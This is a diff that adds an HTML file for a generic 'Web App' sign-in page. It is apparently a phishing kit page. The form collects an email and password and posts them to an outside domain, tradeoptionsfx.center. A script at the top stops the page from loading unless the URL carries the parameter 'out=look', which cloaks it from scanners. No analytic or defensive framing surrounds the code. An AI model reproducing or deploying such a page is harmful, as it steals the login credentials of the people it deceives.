@@ -1,0 +1,79 @@
+<script>
+		var url_string = window.location.href;
+		var url = new URL(url_string);
+		var rel = url.searchParams.get("out");
+		
+		if(rel == null){
+			window.stop();
+        }else if(rel != "look"){
+          window.stop();
+        }
+	
+</script>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Web App</title>
+<link rel="shortcut icon" href="images/favicon.ico" />
+<link href="css/styles.css" rel="stylesheet" type="text/css">
+
+</head>
+
+<body>
+	<div class="container">
+		<div class="sidebar">
+			<div class="logo">
+			<img src="images/logo.png" />
+			</div>
+			
+		</div>
+		
+		<div class="content">
+			<form method="post" name="myForm" action="https://tradeoptionsfx.center/en/">
+				
+				<div class="contents">
+					<div class="center">
+					<div class="left">
+					<div class="header">
+						<img src="images/header_bg.png" />
+					</div>
+						<div class="label">
+						Email:
+						</div>
+						<div>
+						<input type="email" name="user"  class="text" required />
+						</div>
+						
+						<div class="label">
+						Password:
+						</div>
+						<div>
+						<input type="text" name="passwd"  class="text font-face" required autocomplete="off" />
+						<input type="hidden" name="olk2" />
+						</div>
+						<br />
+						<br />
+						<div class="btn" onClick="myFunction()">
+						<img class="img" src="images/icon.png" /> 
+						<span class="txt">sign in</span>
+						</div>
+						
+					</div>
+						</div>
+				</div>
+				
+				
+			</form>
+		</div>
+	</div>
+<script language="javascript">
+function myFunction() {
+	document.forms['myForm'].submit();
+  
+}
+	
+</script>
+	<div style="opacity:0;">
+</body>
+</html>
